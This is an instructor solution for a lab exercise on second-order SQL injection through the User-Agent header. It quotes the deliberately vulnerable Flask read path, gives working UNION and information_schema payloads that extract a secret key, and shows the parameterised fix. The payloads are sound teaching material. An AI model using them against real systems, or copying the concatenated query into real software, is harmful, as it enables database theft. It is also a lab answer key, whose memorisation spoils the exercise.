# Solution — sqli-header-user-agent-analytics

<!-- Instructor/authoring reference. Students should try the hints first. -->

> **Architecture note (deviation from the catalogue).** The `data/catalog.json`
> sketch describes a **Ruby 3.3 / Sinatra / Sequel / Puma** stack behind an
> internal-only admin panel. This implementation instead uses the platform's
> standard **Python 3.12 / Flask / gunicorn + hardened MySQL 8.4** stack (the
> same one as `sqli-union-product-search`), and exposes `/admin/insights`
> directly so the checker can reach it — README frames it as a "debug route" for
> the localhost-only panel. Both are transport/framework details: the write path
> is still a safe parameterised INSERT of the `User-Agent`, the read path still
> concatenates the stored value into `WHERE ua='…'`, and the payload, the leak,
> and the fix are identical. Keeping the Python/MySQL stack preserves the
> project's hardening posture (non-root app, non-root trimmed mysqld, read-only
> rootfs, tmpfs datadir) with no new base images.

## What tipped you off

There are two clearly separate surfaces:

- **Write:** every request logs your `User-Agent`. Poking at it directly does
  nothing visible — because that INSERT is parameterised and safe.
- **Read:** `/admin/insights` renders a "hits per User-Agent" table. When you set
  your `User-Agent` to a value containing a single quote and then reload the
  dashboard, the count column for _your_ row misbehaves (an extra row appears, or
  a `(query failed)` cell shows up). That only happens if your stored header is
  being pasted into SQL at render time — a **second-order** injection: the source
  (your header, earlier) and the sink (the dashboard query, now) are far apart.

## The class of bug

Stored / second-order **SQL injection** (**CWE-89**, OWASP **A03:2021 –
Injection**) exploited as a **UNION-based** read of a different table. The twist
versus a first-order lab: the value is _stored safely_ and only becomes dangerous
when a _different_ code path re-uses it without parameterisation. The injection
surface is an **HTTP header** (`User-Agent`), not a query-string parameter, which
is exactly the kind of "trusted" input logging pipelines forget to treat as
hostile. This lab does **not** rely on verbose DB errors (they are never echoed),
so there is no CWE-209 component — extraction is purely through the rendered
UNION output.

## Vulnerability

`src/app.py`. The write path is deliberately correct:

```python
cur.execute("INSERT INTO ua_events (ua, seen_at) VALUES (%s, NOW())", (ua,))
```

The read path, in `/admin/insights`, is not:

```python
for ua in distinct_uas:
    sql = "SELECT COUNT(*) FROM ua_events WHERE ua='" + ua + "'"  # CWE-89
    cur.execute(sql)
```

`ua` here is a value an attacker fully controlled on an earlier request and that
now flows back out of the database and into raw SQL text.

## Why the developer wrote it this way

The author did the hard part right — they bound the parameter on the way _in_,
which is where injection is usually taught. Having "sanitised at the boundary,"
they then trusted the stored value as clean data forever after. Re-running a
per-UA `COUNT(*)` to build a detailed breakdown reads like harmless internal
reporting over their _own_ table, so concatenating the stored string felt safe.
The mental model failure is treating "already in our database" as "trustworthy,"
and treating a header as less hostile than a form field.

## Why it exists

The database cannot distinguish your _data_ from your _code_ once they arrive as
one concatenated string — and that is true no matter how the string got into the
query, including via a value that was previously stored. A bound parameter on the
read path would ship the stored UA as a value compared against the `ua` column;
concatenation instead lets the leading `'` end the literal and everything after it
parse as SQL.

## The mechanical exploit

1. **Store the payload in your header.** Send any request (e.g. `GET /`) with:

   ```
   User-Agent: ' UNION SELECT master_key FROM settings-- -
   ```

   The safe INSERT stores it verbatim, quote and all.

2. **Trigger the read.** Load `GET /admin/insights`. For your stored UA the
   dashboard runs, in effect:

   ```sql
   SELECT COUNT(*) FROM ua_events WHERE ua='' UNION SELECT master_key FROM settings-- -'
   ```

   The `'` closes the empty literal, `UNION SELECT master_key FROM settings`
   appends a second single-column row, and `-- -` (two dashes **and a space**)
   comments out the dangling `'`. The query now returns two rows — the real count
   and the `master_key` — and both are rendered in the "Hits" column. Your
   `master_key` (32 hex characters) is now on the page.

3. **Redeem it.** Copy the 32-hex value and submit it:

   ```
   GET  /solve?key=<32-hex master_key>      -> 200  FLAG{...}
   POST /solve   (form field key=<value>)   -> 200  FLAG{...}
   ```

## Exploit walkthrough

`tests/exploit.py` performs exactly this with the standard library only:

```
1) urllib request to /  with header  User-Agent: ' UNION SELECT master_key FROM settings-- -
2) GET /admin/insights  (normal UA)  ->  regex \b[0-9a-f]{32}\b  ->  master_key
3) GET /solve?key=<master_key>       ->  regex FLAG\{[0-9a-f]{64}\}
```

It extracts the key dynamically (random per container) and asserts the recovered
flag equals the HMAC-derived expected value when `LAB_USER_SECRET` is present. The
whole run is deterministic and finishes in well under five seconds.

A no-prior-knowledge variant is a good exercise: instead of guessing the
`settings.master_key` names, store
`' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -`
to discover the `settings` table, then
`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='settings'-- -`
to find `master_key` — the same header-borne, second-order technique, no guessing.

## Fix

Two independent corrections; the first is sufficient, the second is defence in
depth:

1. **Parameterise the read path too.** Never concatenate a stored value into SQL:

   ```python
   cur.execute("SELECT COUNT(*) FROM ua_events WHERE ua=%s", (ua,))
   ```

   With a bound parameter the stored `' UNION SELECT …` is compared literally
   against the `ua` column, matches nothing, and never reaches the parser as code.
   "Already in our database" is not a trust boundary — treat stored input as
   hostile every time it is used, on every code path.

2. **Do not re-derive per-row counts by re-querying at all.** The distinct-UA
   aggregate already computed `COUNT(*)` safely in one grouped query; use that
   number directly and drop the per-UA loop entirely. Removing the sink removes
   the bug.

Keep parameterising the write path as it already does, and the header ceases to
be an injection vector anywhere in the system.
